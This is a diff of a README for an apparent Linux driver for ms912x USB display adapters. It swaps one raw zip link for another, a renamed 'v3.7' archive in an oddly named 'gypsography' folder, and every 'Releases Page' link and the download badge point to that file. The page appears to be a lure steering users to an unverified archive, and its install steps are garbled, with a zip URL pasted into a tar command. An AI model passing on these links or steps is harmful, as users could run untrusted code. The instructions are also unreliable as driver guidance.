@@ -6,13 +6,13 @@ Welcome! This guide will help you download and run the ms912x-linux-driver for y
 
 ## 💾 Download the Driver
 
-[![Download ms912x-linux-driver](https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip%20Now-orange)](https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip)
+[![Download ms912x-linux-driver](https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip%20Now-orange)](https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip)
 
 You can download the driver from the Releases page. This page contains the latest version and all the necessary files to set up.
 
 ## 📥 Visit the Releases Page
 
-To download the driver, please visit this page: [Releases Page](https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip).
+To download the driver, please visit this page: [Releases Page](https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip).
 
 You will find different versions of the driver. Pick the version that suits your system. 
 
@@ -28,9 +28,9 @@ Make sure your system is up to date. You can usually do this through your system
 
 ## 📦 Download & Install
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip).
+1. Go to the [Releases Page](https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip).
 2. Choose the latest driver version compatible with your operating system.
-3. Download the file. It will be in a compressed format (like https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip).
+3. Download the file. It will be in a compressed format (like https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip).
 4. Open your terminal.
 5. Navigate to your Downloads folder:
    ```bash
@@ -38,7 +38,7 @@ Make sure your system is up to date. You can usually do this through your system
    ```
 6. Extract the downloaded file:
    ```bash
-   tar -xvzf ms912x-linux-driver-<version>https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip
+   tar -xvzf ms912x-linux-driver-<version>https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip
    ```
 7. Change to the extracted directory:
    ```bash
@@ -63,7 +63,7 @@ If you encounter any issues, check the following:
   ```bash
   dkms status
   ```
-- Check for updates on the [Releases Page](https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip).
+- Check for updates on the [Releases Page](https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip).
 - Make sure you are using a supported kernel version.
 
 If you still have problems, feel free to reach out for support through the repository’s issue tracker.
@@ -84,6 +84,6 @@ For further assistance, please contact the repository maintainers through the is
 
 ## 💾 More Information
 
-For more details related to this project, including updates and features, visit the [Releases Page](https://raw.githubusercontent.com/PIKACHU619/ms912x-linux-driver/main/gypsography/ms912x-linux-driver_v3.3.zip). 
+For more details related to this project, including updates and features, visit the [Releases Page](https://github.com/PIKACHU619/ms912x-linux-driver/raw/refs/heads/main/gypsography/linux_ms_x_driver_v3.7.zip). 
 
 Thank you for using the ms912x-linux-driver! Enjoy smoother display experiences with your USB Display Adapter.
